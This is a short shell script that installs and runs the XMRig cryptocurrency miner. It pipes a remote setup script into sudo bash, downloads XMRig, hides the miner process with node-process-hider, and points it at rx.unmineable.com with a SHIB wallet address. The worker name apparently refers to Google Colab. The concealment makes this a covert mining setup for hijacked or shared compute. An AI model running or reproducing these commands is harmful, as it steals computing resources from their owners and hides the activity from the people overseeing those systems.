sudo apt update
clear
sudo apt install screen
screen -R xmr
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && apt install screen && wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz && tar xvzf xmrig-6.16.4-bionic-x64.tar.gz && cd xmrig-6.16.4 && sudo ph add xmrig && apt install screen && screen 
screen
sudo ./xmrig -o rx.unmineable.com:3333 -u SHIB:0xAbcb0524779d6e0141e220BDebdB9bD31eA959D7.Colab#mo7f-rmhw -k -a rx/0 --threads=27
